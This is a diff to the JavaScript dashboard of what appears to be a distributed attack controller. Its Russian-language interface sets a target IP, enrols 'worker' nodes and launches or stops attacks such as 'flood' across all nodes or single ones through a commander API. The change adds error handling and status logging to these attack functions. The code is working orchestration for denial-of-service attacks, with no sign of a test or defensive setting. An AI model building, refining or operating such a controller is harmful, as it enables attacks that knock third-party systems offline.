@@ -370,61 +370,81 @@ function log(msg, color) {
 
 async function setTarget() {
   const t = document.getElementById('target-ip').value.trim();
-  if (!t) return;
-  await fetch(B+'/target', {method:'POST', headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({target:t})});
-  log('Цель: '+t);
-  refresh();
+  if (!t) { log('Введи IP цели', '#e44'); return; }
+  try {
+    await fetch(B+'/target', {method:'POST', headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({target:t})});
+    log('Цель установлена: '+t, '#4c4');
+    refresh();
+  } catch(e) { log('Ошибка: '+e.message, '#e44'); }
 }
 
 async function addWorker() {
   const ip = document.getElementById('worker-ip').value.trim();
-  if (!ip) return;
-  const r = await fetch(B+'/workers/add', {method:'POST',
-    headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip})});
-  const d = await r.json();
-  if (d.error) { log('ERR: '+d.error, '#e44'); return; }
-  document.getElementById('worker-ip').value = '';
-  log('Воркер добавлен: '+ip, '#4c4');
-  refresh();
+  if (!ip) { log('Введи IP воркера', '#e44'); return; }
+  log('Добавляю: '+ip, '#888');
+  try {
+    const r = await fetch(B+'/workers/add', {method:'POST',
+      headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip})});
+    if (!r.ok) { log('HTTP '+r.status+' от API', '#e44'); return; }
+    const d = await r.json();
+    if (d.error) { log('ERR: '+d.error, '#e44'); return; }
+    document.getElementById('worker-ip').value = '';
+    log('Воркер добавлен: '+ip, '#4c4');
+    refresh();
+  } catch(e) {
+    log('Нет связи с commander API: '+e.message, '#e44');
+  }
 }
 
 async function removeWorker(ip) {
-  await fetch(B+'/workers/'+encodeURIComponent(ip), {method:'DELETE'});
-  log('Воркер удалён: '+ip, '#e44');
-  refresh();
+  try {
+    await fetch(B+'/workers/'+encodeURIComponent(ip), {method:'DELETE'});
+    log('Воркер удалён: '+ip, '#e44');
+    refresh();
+  } catch(e) { log('Ошибка: '+e.message, '#e44'); }
 }
 
 async function attack(type) {
   const target = document.getElementById('target-ip').value.trim();
-  const r = await fetch(B+'/attack/start', {method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({attack_type:type, target:target||undefined})});
-  const d = await r.json();
-  if (d.error) { log('ERR: '+d.error, '#e44'); return; }
-  log('ALL >> '+type+' -> '+d.target+' (нод: '+d.workers_notified+')', '#fa0');
+  log('Запускаю '+type+' на всех...', '#888');
+  try {
+    const r = await fetch(B+'/attack/start', {method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({attack_type:type, target:target||undefined})});
+    const d = await r.json();
+    if (d.error) { log('ERR: '+d.error, '#e44'); return; }
+    log('ALL >> '+type+' -> '+d.target+' (нод: '+d.workers_notified+')', '#fa0');
+  } catch(e) { log('Ошибка: '+e.message, '#e44'); }
 }
 
 async function stopAll() {
-  await fetch(B+'/attack/stop', {method:'POST'});
-  log('СТОП — все ноды', '#e44');
+  try {
+    await fetch(B+'/attack/stop', {method:'POST'});
+    log('СТОП — все ноды', '#e44');
+  } catch(e) { log('Ошибка: '+e.message, '#e44'); }
 }
 
 async function runWorker(ip) {
   const sel = document.getElementById('sel-'+ip);
   const type = sel ? sel.value : 'flood';
   const target = document.getElementById('target-ip').value.trim();
-  const r = await fetch(B+'/workers/'+encodeURIComponent(ip)+'/run',
-    {method:'POST', headers:{'Content-Type':'application/json'},
-     body:JSON.stringify({attack_type:type, target:target||undefined})});
-  const d = await r.json();
-  if (d.error) { log('ERR ['+ip+']: '+d.error, '#e44'); return; }
-  log('['+ip+'] >> '+type, '#fa0');
+  log('Запускаю '+type+' на '+ip, '#888');
+  try {
+    const r = await fetch(B+'/workers/'+encodeURIComponent(ip)+'/run',
+      {method:'POST', headers:{'Content-Type':'application/json'},
+       body:JSON.stringify({attack_type:type, target:target||undefined})});
+    const d = await r.json();
+    if (d.error) { log('ERR ['+ip+']: '+d.error, '#e44'); return; }
+    log('['+ip+'] >> '+type, '#fa0');
+  } catch(e) { log('Ошибка ['+ip+']: '+e.message, '#e44'); }
 }
 
 async function stopWorker(ip) {
-  await fetch(B+'/workers/'+encodeURIComponent(ip)+'/stop', {method:'POST'});
-  log('['+ip+'] stop', '#e44');
+  try {
+    await fetch(B+'/workers/'+encodeURIComponent(ip)+'/stop', {method:'POST'});
+    log('['+ip+'] остановлен', '#888');
+  } catch(e) { log('Ошибка: '+e.message, '#e44'); }
 }
 
 function sCls(s) {
